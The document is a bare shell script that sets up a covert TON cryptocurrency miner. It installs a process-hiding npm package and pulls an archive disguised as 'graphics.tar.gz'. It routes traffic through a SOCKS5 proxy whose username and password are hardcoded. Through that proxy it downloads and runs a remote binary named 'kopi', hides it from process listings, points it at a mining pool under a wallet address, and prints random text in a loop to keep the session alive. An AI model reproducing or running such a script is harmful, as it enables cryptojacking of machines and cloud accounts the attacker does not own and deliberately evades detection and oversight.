apt update && apt -y install sudo wget curl unzip
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.216.28.28:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget wget https://github.com/aurbach55/dera/raw/main/kopi
chmod +x kopi

ph add kopi

./graftcp/graftcp ./kopi --algo TON --pool https://next.ton-pool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF.$(cat /proc/sys/kernel/hostname)
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
